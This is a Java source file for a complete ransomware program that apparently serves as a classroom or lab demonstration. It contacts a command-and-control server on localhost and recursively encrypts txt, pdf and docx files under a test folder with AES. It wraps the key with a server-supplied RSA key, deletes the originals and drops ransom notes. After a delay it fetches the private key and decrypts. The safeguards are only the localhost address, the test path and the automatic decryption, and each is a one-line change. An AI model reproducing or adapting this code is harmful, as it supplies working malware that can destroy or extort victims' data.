import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.List;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Ransomware {
	
	// In milliseconds, how long to wait before things are decrypted.
	private static final int DECRYPTION_DELAY = 10000;
	private static final int IV_LENGTH = 16;
	private static final String TARGET_DIR = System.getProperty("user.home") + "\\Desktop\\testFolder";
	private static final String EXTENSION = ".RANSOM";
	private static final int PORT_NUM = 2435;
	private static final String RANSOM_TEXT = "You have been hit by ransomware! Your files will be "
			+ "decrypted soon, no need to send money :)";
	private static final String RANSOM_NAME = "RANSOM_INSTRUCTIONS.txt";
	
	private static List<String> targetedExtensions = new ArrayList<String>();
	private static Cipher cipherAES = null, cipherRSA = null;
	private static PublicKey publicKey = null;
	private static PrivateKey privateKey = null;
	private static byte[] encryptedSymmetricKey = null;
	
	public static void main(String [] args) {
		// Connect to the C&C server
		Socket clientSocket = createClientSocket();
		
		// Specify the file types to encrypt
		final String[] ext = {"txt", "pdf", "docx"};
		for(String s: ext) {
			targetedExtensions.add(s);
		}
		
		createAESCipher();
		
		// Get a list of files to encrypt
		List<File> targetedFiles = new ArrayList<File>();
		getAllFiles(TARGET_DIR, targetedFiles, true);
		
		// Generate a secure 256 bit symmetric key for AES to use
		SecretKey key = createKey();
		
		encryptFiles(targetedFiles, key);
		deleteOriginals(targetedFiles);
		
		createRSACipher();
		getRSAPublicKey(clientSocket);
		initRSAEncryptionCipher();
		
		// Encrypt the symmetric key with the RSA public key
		try {
			encryptedSymmetricKey = cipherRSA.doFinal(key.getEncoded());
		} catch (IllegalBlockSizeException | BadPaddingException e1) {
			e1.printStackTrace();
			System.exit(1);
		}
		
		/* 
		 * Delete the plaintext AES key (might not work right away,
		*  Java's garbage collector cannot be controlled...)
		*/
		key = null;
		System.gc();
		
		startWaiting();

		System.out.println("Connecting to C&C server for decryption key...");
		
		// Reset the client socket
		clientSocket = createClientSocket();
		
		getRSAPrivateKey(clientSocket);
		initRSADecryptionCipher();
		
		byte[] symmetricKeyBytes = decryptAESKey();
		SecretKey symmetricKey = new SecretKeySpec(symmetricKeyBytes, "AES");
		
		// Get a list of encrypted files
		targetedFiles.clear();
		getAllFiles(TARGET_DIR, targetedFiles, false);
		
		decryptFiles(targetedFiles, symmetricKey);
		deleteEncryptedAndRansomFiles(targetedFiles);
	}


	private static Socket createClientSocket() {
		Socket clientSocket = null;
		try {
			clientSocket = new Socket("localhost", PORT_NUM);
		} catch (IOException e1) {
			e1.printStackTrace();
		}finally {
			if(clientSocket == null) {
				System.out.println("Client socket is null. Make sure to start the C&C server first!");
				System.exit(1);
			}
		}
		return clientSocket;
	}


	private static void createAESCipher() {
		try {
			cipherAES = Cipher.getInstance("AES/CBC/PKCS5Padding");
		} catch (NoSuchAlgorithmException | NoSuchPaddingException e1) {
			e1.printStackTrace();
		}finally {
			if(cipherAES == null) {
				System.out.println("Could not create cipher instances.");
				System.exit(0);
			}
		}
	}

	
	private static void getAllFiles(String directoryName, List<File> files, boolean placeNote) {
	    File directory = new File(directoryName);

    	if(placeNote) {
    		placeRansomNote(directory);
    	}
    	
	    File[] fList = directory.listFiles();
	    if(fList != null) {
	        for (File file : fList) {      
	            if (file.isFile()) {
	                files.add(file);
	            } else if (file.isDirectory()) {
	            	// Skip over Windows OS folders
	            	if(!(file.getAbsolutePath().equals("C:\\Program Files") ||
	            	   file.getAbsolutePath().equals("C:\\Program Files (x86)") ||
	            	   file.getAbsolutePath().equals("C:\\Windows"))) 
	            	{
		            	getAllFiles(file.getAbsolutePath(), files, placeNote);
	            	}

	            }
	        }
	    }
	}
	
	
	private static void placeRansomNote(File dir) {
		String loc = dir.getAbsolutePath();
		File ransomFile = new File(loc + "\\" + RANSOM_NAME);
		try {
			BufferedWriter output = new BufferedWriter(new FileWriter(ransomFile));
			output.write(RANSOM_TEXT);
			output.close();
		} catch (IOException e) {
			//e.printStackTrace();
		}
	}


	private static SecretKey createKey() {
		SecretKey key = null;
		try {
			key = generateAESKey();
		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
		}finally{
			if(key == null) {
				System.out.println("Could not create an encryption key.");
				System.exit(0);
			}
		}
		
		return key;
	}
	
	
	/* 
	 * Loop through each file, get its data, encrypt it,
	*  and then create a new file with the encrypted data.
	*/
	private static void encryptFiles(List<File> results, SecretKey key) {
		for(File file: results) {
			
			// Check to see if the file extension is in the allowed list.
			String extension = getFileExtension(file.getName());
			if(!targetedExtensions.contains(extension) || 
					file.getName().equals(RANSOM_NAME)) {
				continue;
			}
			
			IvParameterSpec iv = createRandomIV();
			
			// Initialize the encryption cipher with the key and IV
			try {
				cipherAES.init(Cipher.ENCRYPT_MODE, key, iv);
			} catch (InvalidKeyException | InvalidAlgorithmParameterException e) {
				System.out.println("Could not init cipher for encryption.");
				System.exit(1);
			}
			
			/*
			 * Get the file data as a byte array and
			 * then create a new encrypted file from it.
			 */
			byte[] data = getFileData(file);
			if(data != null) {
				byte[] encryptedData = encryptData(data);
				File emptyFile = makeEmptyFile(file, true);
				
				// Add the IV and then append the encrypted data to the new file.
				addDataToFile(emptyFile, iv.getIV(), encryptedData);
			}
		}
	}
	
	
	// Delete the original, non encrypted files.
	private static void deleteOriginals(List<File> results) {
		for(File file: results) {
			String extension = getFileExtension(file.getName());
			if(targetedExtensions.contains(extension) &&
					!file.getName().equals(RANSOM_NAME)) {
				file.delete();
			}
		}
	}
	

	private static void createRSACipher() {
		try {
			cipherRSA = Cipher.getInstance("RSA/ECB/PKCS1Padding");
		} catch (NoSuchAlgorithmException | NoSuchPaddingException e1) {
			e1.printStackTrace();
		}finally {
			if(cipherRSA == null) {
				System.out.println("Could not create RSA cipher instance.");
				System.exit(0);
			}
		}
	}
	
	
	private static void initRSAEncryptionCipher() {
		try {
			cipherRSA.init(Cipher.ENCRYPT_MODE, publicKey);
		} catch (InvalidKeyException e) {
			System.out.println("Could not init RSA cipher.");
			e.printStackTrace();
			System.exit(1);
		}		
	}
	
	
	private static void initRSADecryptionCipher() {
		try {
			cipherRSA.init(Cipher.DECRYPT_MODE, privateKey);
		} catch (InvalidKeyException e) {
			System.out.println("Could not init RSA cipher.");
			e.printStackTrace();
			System.exit(1);
		}		
	}
	
	
	private static byte[] decryptAESKey() {
		byte[] symmetricKeyBytes = null;
		try {
			symmetricKeyBytes = cipherRSA.doFinal(encryptedSymmetricKey);
		} catch (IllegalBlockSizeException | BadPaddingException e) {
			e.printStackTrace();
		}finally {
			if(symmetricKeyBytes == null) {
				System.out.println("Decrypted symmetric key is null.");
				System.exit(1);
			}
		}
		return symmetricKeyBytes;
	}


	private static void startWaiting() {
		System.out.println("Finished encryption. Decrypting files in " 
		+ DECRYPTION_DELAY / 1000 + " seconds...\nDo not exit this "
		+ "program or the files will be lost forever.");
		try {
			Thread.sleep(DECRYPTION_DELAY);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}


	private static void getRSAPrivateKey(Socket clientSocket) {
		try {
			InputStream inputStream = clientSocket.getInputStream();
			ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
			PrivateKeySer privateKeySer = (PrivateKeySer) objectInputStream.readObject();
			objectInputStream.close();
			privateKey = privateKeySer.getPrivateKey();
		} catch (IOException e) {
			System.out.println("Could not create input stream.");
			e.printStackTrace();
			System.exit(1);
		} catch (ClassNotFoundException e) {
			System.out.println("Could not find class for the private key");
			System.exit(1);
		}
	}


	private static void getRSAPublicKey(Socket clientSocket) {
		try {
			InputStream inputStream = clientSocket.getInputStream();
			ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
			PublicKeySer publicKeySer = (PublicKeySer) objectInputStream.readObject();
			objectInputStream.close();
			clientSocket.close();
			publicKey = publicKeySer.getPublicKey();
		} catch (IOException e) {
			System.out.println("Could not create input stream.");
			e.printStackTrace();
			System.exit(1);
		} catch (ClassNotFoundException e) {
			System.out.println("Could not find class for the public key");
			System.exit(1);
		}
	}
	

	private static void decryptFiles(List<File> results, SecretKey key) {
		System.out.println("Decrypting your files...");
		for(File file: results) {
			// Only decrypt files with extension of .RANSOM
			String extension = getFileExtension(file.getName());
			if(!extension.equals(EXTENSION.substring(1, EXTENSION.length()))) {
				continue;
			}
			
			byte[] fileData = getFileData(file);
			
			if(fileData != null) {
				byte[] iv = extractBytes(fileData, 0, IV_LENGTH);
				byte[] encryptedData = extractBytes(fileData, IV_LENGTH, fileData.length);
				
				setIVOfDecryptionCipher(iv, key);
				
				byte[] decryptedData = decryptData(encryptedData);
				File emptyFile = makeEmptyFile(file, false);
				addDataToFile(emptyFile, decryptedData);
			}
		}
	}


	private static void deleteEncryptedAndRansomFiles(List<File> results) {
		System.out.println("Deleting .RANSOM and ransom note files...");
		for(File file: results) {
			String extension = getFileExtension(file.getName());
			if(extension.equals(EXTENSION.substring(1, EXTENSION.length()))) {
				file.delete();
			}
			if(file.getName().equals(RANSOM_NAME)) {
				file.delete();
			}
		}
	}
	
	
	private static void setIVOfDecryptionCipher(byte[] iv, SecretKey key) {
		IvParameterSpec ivSpec = new IvParameterSpec(iv);
		try {
			cipherAES.init(Cipher.DECRYPT_MODE, key, ivSpec);
		} catch (InvalidKeyException | InvalidAlgorithmParameterException e) {
			System.out.println("Could not init decryption cipher.");
			System.exit(1);
		}
	}


	private static byte[] extractBytes(byte[] fileData, int start, int end) {
		byte[] bytesArray = new byte[end - start];
		int indexCounter = 0;
		for(int i = start; i < end; i++) {
			bytesArray[indexCounter] = fileData[i];
			indexCounter++;
		}
		return bytesArray;
	}


	private static IvParameterSpec createRandomIV() {
		SecureRandom random = new SecureRandom();
		byte[] iv = new byte[cipherAES.getBlockSize()];
		random.nextBytes(iv);
		return new IvParameterSpec(iv);
	}
	

	private static String getFileExtension(String fileName) {
		int i = fileName.lastIndexOf('.');
		int length = fileName.length();
		return fileName.substring(i+1, length);
	}
	
	
	private static SecretKey generateAESKey() throws NoSuchAlgorithmException {
		KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
		SecureRandom secureRandom = new SecureRandom();
		int keyBitSize = 256;
		keyGenerator.init(keyBitSize, secureRandom);
		return keyGenerator.generateKey();		
	}


	private static byte[] getFileData(File file) {
		String p = file.getAbsolutePath();
		Path path = Paths.get(p);
		try {
			byte[] data = Files.readAllBytes(path);
			return data;
		} catch (IOException e) {
			System.out.println("Could not read file: " + file.getName());
			return null;
		}
	}
	
	
	private static byte[] encryptData(byte[] data) {
		byte[] encryptedData = null;
		try {
			encryptedData = cipherAES.doFinal(data);
		} catch (IllegalBlockSizeException | BadPaddingException e) {
			System.out.println("Could not encrypt data.");
			e.printStackTrace();
			System.exit(0);
		}
		
		return encryptedData;
	}


	private static byte[] decryptData(byte[] encryptedData) {
		byte[] data = null;
		try {
			data = cipherAES.doFinal(encryptedData);
		} catch (IllegalBlockSizeException | BadPaddingException e) {
			System.out.println("Could not encrypt data.");
			e.printStackTrace();
			System.exit(0);
		}
		
		return data;
	}
	
	
	private static File makeEmptyFile(File file, boolean encryptMode) {
		File newFile;
		if(encryptMode) {
			newFile = new File(file.getAbsolutePath() + EXTENSION);
		}else {
			int lengthName = file.getAbsolutePath().length();
			int lengthExt = EXTENSION.length();
			String originalFileName = file.getAbsolutePath().substring(0, lengthName - lengthExt);
			newFile = new File(originalFileName);
		}

		try {
			newFile.createNewFile();
		} catch (IOException e) {
			System.out.println("Could not create file at: " + file.getAbsolutePath() + EXTENSION);
			//e.printStackTrace();
		}	
		
		return newFile;
	}
	
	
	private static void addDataToFile(File file, byte[] ... data) {
		String path = file.getAbsolutePath();
		try (FileOutputStream stream = new FileOutputStream(path)) {
		    try {
		    	for(byte[] array: data) {
					stream.write(array);
		    	}
			} catch (IOException e) {
				//e.printStackTrace();
			}
		} catch (FileNotFoundException e1) {
			//e1.printStackTrace();
		} catch (IOException e1) {
			//e1.printStackTrace();
		}
	}
}
